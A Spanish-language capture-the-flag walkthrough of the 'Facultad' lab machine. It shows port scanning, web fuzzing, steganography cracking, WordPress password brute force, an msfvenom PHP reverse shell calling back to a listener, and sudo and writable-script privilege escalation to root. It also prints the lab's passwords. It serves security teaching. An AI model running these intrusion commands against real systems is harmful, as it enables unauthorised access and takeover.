# 🧠 Resolución del CTF "Facultad" | The HackersLabs

**Plataforma:** TheHackersLabs\
**Nombre de la máquina:** Facultad\
**Dificultad:** Fácil – Ideal para iniciarse en enumeración web, esteganografía, WordPress, y escalada de privilegios\
**Autor:** Beafn28

---

## 🔍 1. Escaneo inicial: reconocimiento de servicios y puertos

Ejecutamos `nmap` para descubrir servicios activos:

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.117 -oN escaneo.txt
```
<img width="821" height="512" alt="image" src="https://github.com/user-attachments/assets/de17e4ed-85e1-4410-9677-75b51ec347cd" />

**Resultado:**

- `22/tcp` → SSH (OpenSSH 9.2p1)
- `80/tcp` → HTTP (Apache 2.4.62)
- `3306/tcp` → MySQL

La MAC revela que es una VM de VirtualBox corriendo Linux.


## 🌐 2. Fuerza bruta web: directorios y archivos ocultos

Lanzamos un escaneo web con `feroxbuster`:

```bash
gobuster dir -u http://192.168.1.117/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x php
gobuster dir -u http://192.168.1.117/education/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x php
```

Se detectan rutas interesantes:

- `/education`
- `/images/facultad.jpg`


## 🖼 3. Esteganografía: extrayendo datos ocultos en imagen

Intentamos extraer información con `stegseek`:

```bash
stegseek facultad.jpg /usr/share/wordlists/rockyou.txt
```
<img width="287" height="62" alt="image" src="https://github.com/user-attachments/assets/200a8143-62b8-4e31-afd2-690629261e95" />

Se obtiene `mensaje.txt`:

<img width="446" height="81" alt="image" src="https://github.com/user-attachments/assets/a744578e-2f3a-4367-a8be-04934ff9c831" />


## 🛡 4. Ataque a WordPress: enumeración y fuerza bruta

Confirmamos WordPress en `/education`. Usamos `wpscan`:

```bash
wpscan --url http://192.168.1.117/education/ --passwords /usr/share/wordlists/rockyou.txt
wpscan --url http://192.168.1.117/education/ --passwords /usr/share/wordlists/rockyou.txt --usernames facultad
```
<img width="295" height="65" alt="image" src="https://github.com/user-attachments/assets/9136439f-a626-4605-9ac2-3e78a59928a5" />

Resultado:
- **Usuario:** facultad\
- **Contraseña:** asdfghjkl


## 👛 5. Reverse shell desde WordPress

Creamos una reverse shell con:

```bash
msfvenom -p php/reverse_php LHOST=192.168.1.109 LPORT=4444 -f raw > shell.php
```
<img width="1130" height="302" alt="image" src="https://github.com/user-attachments/assets/72ef4afa-73ae-4c95-9ef6-5a49ea78edcf" />

La subimos, accedemos a la URL y escuchamos con:

```bash
nc -nlvp 4444
```
<img width="515" height="292" alt="image" src="https://github.com/user-attachments/assets/b13ce956-bd07-47ba-b429-4e602b90fb14" /><br>

<img width="329" height="65" alt="image" src="https://github.com/user-attachments/assets/0e3416b5-7806-4430-918d-95da47c0b5c4" />

Se obtiene acceso como `www-data`.


## ⬆️ 6. Escalada de privilegios a "gabri"

Comprobamos permisos sudo:

```bash
sudo -l
```
<img width="422" height="86" alt="image" src="https://github.com/user-attachments/assets/f468c1da-aeff-43fe-9f88-ff60a9d82a3e" />

Permite ejecutar PHP como `gabri`:

```bash
sudo -u gabri php -r "system('/bin/bash');"
```
<img width="429" height="52" alt="image" src="https://github.com/user-attachments/assets/49630a7b-8978-410f-968e-76b644b9bbc6" />

En `mensaje.txt`, nos daba una pista de que se había dejado en el correo de Gabri la contraseña de Vivian, vamos al correo:

<img width="881" height="82" alt="image" src="https://github.com/user-attachments/assets/611b8e4e-3d84-4c22-a2d7-8a79c5dba4c6" />

Pero está codificada, copiamos e intentamos decodificarla:

<img width="221" height="220" alt="image" src="https://github.com/user-attachments/assets/0adc1bdc-92ac-4c72-a9db-acfcee832bee" />

La contraseña de Vivian es: **lapatrona2025**


## 👑 7. Escalada a root con cron job

Como `vivan`, vemos un script ejecutado por root:

<img width="443" height="86" alt="image" src="https://github.com/user-attachments/assets/102f498f-8120-433c-87f7-f26c05b917ba" />

```bash
/opt/vivian/script.sh
```

Como lo podemos editar, añadimos:

```bash
echo -e '#!/bin/bash\nbash' > /opt/vivian/script.sh
```

Ejecutamos:

```bash
sudo /opt/vivian/script.sh
```

<img width="452" height="86" alt="image" src="https://github.com/user-attachments/assets/930e014d-d8d6-47a3-90f1-0d32f36f1565" />

Y obtenemos acceso como `root`.

---

## 🌟 Conclusión: aprendizajes clave

| Técnica              | Qué aprendimos                              |
| -------------------- | ------------------------------------------- |
| Escaneo con Nmap     | Identificar servicios expuestos             |
| Fuzzing web          | Descubrir rutas ocultas                     |
| Esteganografía       | Extraer datos sensibles de imágenes         |
| WordPress Pentesting | Fuerza bruta y enumeración de usuarios      |
| Reverse Shell        | Acceso interactivo desde servidor web       |
| Escalada con sudo    | Uso de permisos para pivotar a otro usuario |
